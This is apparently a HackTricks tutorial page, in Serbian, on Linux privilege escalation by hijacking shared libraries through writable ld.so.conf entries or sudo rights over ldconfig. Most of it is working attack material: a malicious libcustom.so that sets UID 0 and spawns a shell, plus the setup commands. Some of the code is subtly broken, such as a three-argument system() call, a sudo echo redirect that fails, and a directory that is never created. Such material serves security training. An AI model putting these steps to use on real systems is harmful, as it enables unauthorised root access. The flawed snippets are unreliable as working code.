# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Pripremite okruženje

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te datoteke na vašem računaru u istom folderu
2. **Kompajlirajte** **biblioteku**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privilegije)
4. **Kompajlirajte** **izvršnu datoteku**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete **izvršiti** binarnu datoteku.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

U ovom scenariju pretpostavićemo da je **neko kreirao ranjiv ulaz** unutar datoteke u _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Ranljiva fascikla je _/home/ubuntu/lib_ (gde imamo pravo pisanja).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Sada kada smo **napravili zlu libcustom biblioteku unutar pogrešno konfigurisane** putanje, potrebno je da sačekamo na **ponovno pokretanje** ili da korisnik root izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovu binarnu datoteku kao **sudo** ili da ima **suid bit**, moći ćete da je izvršite sami_).

Kada se to dogodi, **ponovo proverite** odakle `sharevuln` izvršna datoteka učitava `libcustom.so` biblioteku:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava se iz `/home/ubuntu/lib`** i ako bilo koji korisnik to izvrši, izvršiće se shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali modifikovanjem izvršenih komandi i **čekanjem da root ili drugi privilegovani korisnik izvrši ranjivi binarni fajl** moći ćemo da eskaliramo privilegije.

### Druge pogrešne konfiguracije - Ista ranjivost

U prethodnom primeru smo simulirali pogrešnu konfiguraciju gde je administrator **postavio neprivilegovanu fasciklu unutar konfiguracionog fajla unutar `/etc/ld.so.conf.d/`**.\
Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost, ako imate **dozvole za pisanje** u nekom **konfiguracionom fajlu** unutar `/etc/ld.so.conf.d`, u fascikli `/etc/ld.so.conf.d` ili u fajlu `/etc/ld.so.conf` možete konfigurisati istu ranjivost i iskoristiti je.

## Eksploatacija 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
Možete naznačiti `ldconfig` **odakle da učita konf fajlove**, tako da možemo iskoristiti to da nateramo `ldconfig` da učita proizvoljne fascikle.\
Dakle, hajde da kreiramo fajlove i fascikle potrebne za učitavanje "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom eksploitu**, **napravite zlu biblioteku unutar `/tmp`**.\
I konačno, učitajte putanju i proverite odakle se binarni fajl učitava biblioteku:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, imajući sudo privilegije nad `ldconfig`, možete iskoristiti istu ranjivost.**

{{#include ../../banners/hacktricks-training.md}}
